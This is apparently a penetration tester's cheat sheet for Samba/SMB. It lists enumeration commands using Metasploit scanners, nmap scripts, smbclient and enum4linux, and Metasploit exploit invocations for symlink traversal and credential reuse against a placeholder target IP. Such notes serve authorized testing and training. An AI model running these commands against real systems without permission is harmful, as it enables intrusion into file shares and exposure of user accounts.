# Samba

## Enumeration

### Metasploit

##### smb_enumshares
```bash
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS [IP]
set RPORT 445
run
```

##### smb_version
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS [IP]
set RPORT 445
run
```

##### smb_enumusers
```bash
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS [IP]
set RPORT 445
run
```

### Nmap

##### nmap (Samba share enumeration)
```bash
nmap -p 445 --script=smb-enum-shares [IP]
```

##### nmap (Samba version detection)
```bash
nmap -p 445 --script=smb-os-fingerprint [IP]
```

##### nmap (Samba users enumeration)
```bash
nmap -p 445 --script=smb-enum-users [IP]
```

### smbclient

##### smbclient (List shares)
```bash
smbclient -L //[IP] -U guest
```

##### smbclient (Access a share)
```bash
smbclient //[IP]/[SHARE] -U [USER]
```

### enum4linux

##### enum4linux (Basic SMB enumeration)
```bash
enum4linux -a [IP]
```

##### enum4linux (List shares)
```bash
enum4linux -S [IP]
```


---
---


## Exploitation

### Metasploit

##### samba_symlink_traversal
```bash
use exploit/linux/samba/samba_symlink_traversal
set RHOSTS [IP]
set RPORT 445
run
```

##### samba_credential_reuse
```bash
use exploit/linux/samba/samba_credential_reuse
set RHOSTS [IP]
set RPORT 445
set SMBUser [username]
set SMBPass [password]
run
```

